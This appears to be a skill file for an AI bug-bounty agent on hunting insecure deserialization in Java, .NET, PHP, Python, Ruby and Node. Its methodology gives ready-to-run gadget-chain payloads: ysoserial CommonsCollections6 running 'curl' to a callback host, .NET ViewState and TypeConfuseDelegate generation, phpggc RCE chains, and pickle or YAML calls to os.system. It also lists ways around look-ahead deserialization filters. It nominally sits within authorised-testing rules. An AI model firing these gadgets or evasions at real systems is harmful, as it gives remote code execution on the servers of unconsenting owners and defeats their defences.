---
name: hunt-deserialization
description: Insecure deserialization hunting across Java / .NET / PHP / Python / Ruby / Node. Gadget-chain RCE, OOB-gated blind detection, magic-byte fingerprinting. Wiki-first, FIND schema output.
---

# Hunt: Insecure Deserialization

**Assumes `hunt-core`** for the scope gate, two-account rule, confirmation gate, enumeration limits, stop conditions, wiki protocol, FIND output, and Deadends. Do not re-derive any of that here.

## Wiki

```
qmd_query "insecure deserialization gadget chain Java .NET PHP Python Ruby Node ysoserial" via wiki-search MCP
```

Hub: [[web-moc]] (live web index). Primary page: [[insecure-deserialization]]. Payload arsenal: `wiki/payloads/deserialization.md`.
Anchors: [[ml-model-deserialization]].

## Confirmation gate

**Blind deserialization RCE claims require an OOB HIT. No exceptions.** The first payload is always
a benign OOB probe, never a command: Java `URLDNS` / `JRMPClient` force a DNS/TCP callback with zero
code-exec risk, proving the sink deserializes attacker data before you fire a gadget.

**NOT confirmation:** a deserialization error, a type error, a stack trace, a `500`, or the blob
merely being accepted. Any of these alone means the parser saw your bytes, not that you control
execution.

**IS confirmation:** an OOB callback from the gadget to your unique Collaborator / interactsh
subdomain, or a demonstrated effect - command execution, a file read, an SSRF fetch - reproduced in
a clean session per hunt-core. A time-delay gadget that reliably toggles counts as the effect.
Blind cases need the OOB HIT.

When you plant the OOB probe (URLDNS/JRMPClient or any blind payload), append a row to
`targets/<eng>/oob.md`: `| <token> | <sink url+param> | deser | <date> | waiting | |` (columns:
token | sink | class | planted | status | source, token = your unique interactsh label). The
recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart
surfaces HITs; the HIT row is the gate to scaffold the FIND. Do NOT claim a blind deserialization
finding without a HIT row.

## Attack surface signals

Fingerprint serialized blobs by magic bytes / shape:

```
rO0AB...                      Java (base64, 0xAC 0xED 0x00 0x05)
AAEAAAD/////                  .NET BinaryFormatter (base64)
a:2:{... / O:8:"stdClass":    PHP serialize()
gASV / \x80\x04 / \x80\x05    Python pickle (base64 gAS...)
BAh... / --- !ruby/object     Ruby Marshal / YAML
```

Sink locations: cookies (`session`, `auth`, `state`, `viewstate`), hidden form fields,
`Authorization`, API JSON with type hints, message queues, cache, file upload of `.ser`/`.pickle`.

**Rank before firing a gadget.** Not all sinks are equal:

- **ASP.NET `__VIEWSTATE`** - if MAC is off or the machineKey leaked, straight to RCE; check first.
- **Session / auth cookies carrying a serialized blob** - attacker-controlled every request, no
  prior access needed to reach the sink.
- **`.ser`/`.pickle` file uploads and `phar://` sinks** - the parser runs on your bytes by design.
- **API JSON with type hints** (`$type`, `_class`, polymorphic deserializers) - Jackson / fastjson
  default-typing, .NET `TypeNameHandling`.
- **Message-queue / cache payloads** - internal, often unauthenticated, frequently no look-ahead
  filter.

## Methodology
1. Locate serialized data (decode base64, match magic bytes above).
2. **Java:**
```bash
java -jar ysoserial.jar URLDNS "http://probe.<collab>" | base64 -w0     # OOB probe FIRST
java -jar ysoserial.jar CommonsCollections6 "curl http://<collab>/x" | base64 -w0   # after sink confirmed
# .NET ViewState: known machineKey -> ysoserial.net -p ViewState
```
**No ysoserial jar on the box?** (the tooling VM often lacks it; the jitpack build download returns an
empty/9-byte stub.) BUILD the gadget yourself against the target's gadget lib from Maven Central, then
compile with `--release <target-JRE-major>` and run with the right `--add-opens`. Full recipe +
modern-JDK (17/21) gotchas (class-version mismatch, `InaccessibleObjectException`, CC5's String-typed
`BadAttributeValueExpException.val` on JDK 21 -> use CC6) in [[deserialization]] "Build the gadget yourself".
3. **.NET:** `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd"`; ViewState via `ysoserial.net -p ViewState --generator=... --validationkey=...`.
4. **PHP:** craft POP chain from app's `__wakeup`/`__destruct`/`__toString`; `phpggc Framework/RCE1 system id`. Look for `unserialize()` on user input, phar:// (deser via filesystem funcs).
5. **Python:** `pickle.loads` on user data -> `__reduce__` returning `(os.system, ("cmd",))`. yaml.load (unsafe) -> `!!python/object/apply:os.system`.
6. **Ruby:** Marshal.load / unsafe YAML.load -> universal gadget chains (`Gem::...`).
7. **Node:** `node-serialize` `_$$ND_FUNC$$_` IIFE; `funcster`, `serialize-javascript` sinks.
8. **Distill when confirmed** (per hunt-core): reusable gadget chain or framework sink -> `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/insecure-deserialization.md`.

## Chaining

A deserialization sink is usually the RCE itself, not a step toward one: a working gadget executes
your command in-process. When the classpath yields only a partial primitive - URLDNS / JRMPClient
SSRF, a file-read gadget, a JNDI lookup - drive the follow-on through `hunt-rce` (JNDI/LDAP to code
exec, log4shell-style) or the relevant sink skill rather than forcing a command gadget the
look-ahead filter blocks.

## Evasion

Look-ahead deserialization filters (`ValidatingObjectInputStream`, `ObjectInputFilter`, Jackson
allowlists) reject known gadget classes by name. When a confirmed sink rejects CC1-7: switch to a
gadget library actually on the classpath (Spring, Hibernate5, C3P0, ROME, MozillaRhino), try a
different serialization format the same endpoint accepts (XML / JSON / YAML vs binary), nest the
payload (`SignedObject` wrapping), or - .NET - swap the formatter (`LosFormatter`, `SoapFormatter`,
`Json.NET TypeNameHandling`). Fingerprint the exact library version before sweeping blind.

## Severity

- **CRITICAL** - command execution or an OOB code callback from the gadget.
- **HIGH** - file-read or SSRF-only gadget (no command exec).
- **MEDIUM** - DoS-only gadget.

Rated on demonstrated impact per hunt-core, not the theoretical maximum of the class.

## Deadends

Stop after the bounded OOB gadget sweep (per hunt-core / CLAUDE.md: ~30-40 payloads, zero
callbacks) or when the sink deserializes but no gadget on the classpath executes:

```
Append: - [ ] deser on <host> <param> -- Java sink confirmed (URLDNS hit) but CC1-7/Spring/
              Hibernate no exec (hardened classpath / look-ahead filter)
```

Record which gadget libraries and formats you tried, not just that it failed.
